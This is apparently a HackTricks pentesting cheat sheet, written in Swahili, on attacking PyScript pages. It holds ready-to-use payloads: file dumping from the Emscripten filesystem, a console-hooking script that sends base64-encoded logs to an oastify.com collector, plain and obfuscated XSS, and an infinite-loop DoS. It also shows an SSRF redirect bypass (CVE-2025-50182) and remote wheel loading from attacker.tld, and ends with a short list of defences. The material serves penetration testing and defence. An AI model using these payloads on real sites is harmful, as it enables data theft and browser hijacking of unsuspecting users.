# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Mwongozo wa PyScript Pentesting

PyScript ni framework mpya iliyoundwa kwa ajili ya kuunganisha Python kwenye HTML, hivyo inaweza kutumika pamoja na HTML. Katika cheat sheet hii, utapata jinsi ya kutumia PyScript kwa madhumuni yako ya penetration testing.

### Dumping / Retrieving files kutoka kwenye Emscripten virtual memory filesystem:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Result:

![PyScript Pentesting Guide - Kuhifadhi / Kupata faili kutoka kwenye Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (ufuatiliaji wa console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Matokeo:

![Dumping / Retrieving files kutoka kwenye Emscripten virtual memory filesystem - OOB Data Exfiltration ya Emscripten virtual memory filesystem (ufuatiliaji wa console): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Kawaida)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Matokeo:

![Utoaji wa data wa OOB wa mfumo wa faili wa kumbukumbu pepe wa Emscripten (ufuatiliaji wa console) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Matokeo:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Msimbo:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Result:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

Code:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Matokeo:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Udhaifu na mbinu mpya (2023-2025)

### Server-Side Request Forgery kupitia redirects zisizodhibitiwa (CVE-2025-50182)

`urllib3 < 2.5.0` hupuuza vigezo vya `redirect` na `retries` inapoendeshwa **ndani ya Pyodide runtime** inayokuja na PyScript. Wakati mshambuliaji anaweza kudhibiti URL lengwa, anaweza kulazimisha code ya Python kufuata redirects za cross-domain hata kama developer alizizima waziwazi ‑ hivyo kupita kwa ufanisi mantiki ya kuzuia anti-SSRF.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Imewekwa patch katika `urllib3 2.5.0` – sasisha package kwenye PyScript image yako au weka toleo salama kwa `packages = ["urllib3>=2.5.0"]`. Tazama CVE entry rasmi kwa maelezo zaidi.

### Arbitrary package loading & supply-chain attacks

Kwa kuwa PyScript inaruhusu URLs za kiholela katika orodha ya `packages`, mshambuliaji mwenye uwezo wa kubadilisha au kuingiza configuration anaweza kutekeleza **Python ya kiholela kabisa** kwenye browser ya mwathiriwa:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Wheels za pure-Python pekee ndizo zinazohitajika – hakuna hatua ya WebAssembly compilation inayohitajika.* Hakikisha configuration haidhibitiwi na user na uhifadhi wheels zinazoaminika kwenye domain yako mwenyewe yenye HTTPS na SRI hashes.

### Mabadiliko ya output sanitisation (2023+)

* `print()` bado huingiza raw HTML na hivyo iko hatarini kwa XSS (mifano iko hapo juu).
* Helper mpya ya `display()` hu-escape HTML kwa chaguomsingi – raw markup lazima ifungwe katika `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Tabia hii ilianzishwa mwaka 2023 na imeandikwa katika mwongozo rasmi wa Built-ins. Tumia `display()` kwa ingizo lisiloaminika na epuka kuita `print()` moja kwa moja.<sup>[[2]](#references)</sup>

---

## Mbinu Bora za Kujilinda

* **Sasisha packages mara kwa mara** – sasisha hadi `urllib3 >= 2.5.0` na ujenge upya mara kwa mara wheels zinazosafirishwa pamoja na tovuti.
* **Punguza vyanzo vya packages** – rejelea tu majina ya PyPI au URLs za same-origin, ikiwezekana zikiwa zimelindwa kwa Sub-resource Integrity (SRI).
* **Imarisha Content Security Policy** – kataza JavaScript ya ndani (`script-src 'self' 'sha256-…'`) ili blocks za `<script>` zilizoingizwa zisiweze kutekelezwa.
* **Kataza tags za `<py-script>` / `<script type="py">` zinazotolewa na mtumiaji** – safisha HTML kwenye server kabla ya kuirudisha kwa watumiaji wengine.
* **Tenga workers** – ikiwa huhitaji workers kufikia DOM kwa usawazishaji, wezesha flag ya `sync_main_only` ili kuepuka mahitaji ya headers za `SharedArrayBuffer`.

## Marejeo

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
